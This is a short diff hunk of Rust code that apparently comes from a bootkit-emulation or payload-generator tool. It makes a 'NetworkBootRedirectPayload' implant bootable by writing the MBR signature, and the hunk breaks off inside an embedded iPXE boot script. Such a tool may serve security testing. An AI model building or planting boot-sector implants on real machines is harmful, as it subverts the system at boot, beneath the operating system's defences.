@@ -21,6 +21,11 @@ impl Payload for NetworkBootRedirectPayload {
         let size = config.size.max(0x800);
         let mut data = vec![0u8; size];
 
+        // MBR boot signature: this implant models a boot-sector-resident
+        // bootkit (it redirects boot flow), so the sector is bootable.
+        data[510] = 0x55;
+        data[511] = 0xAA;
+
         let script = b"#!ipxe\n\
                        dhcp\n\
                        set keep-san 1\n\
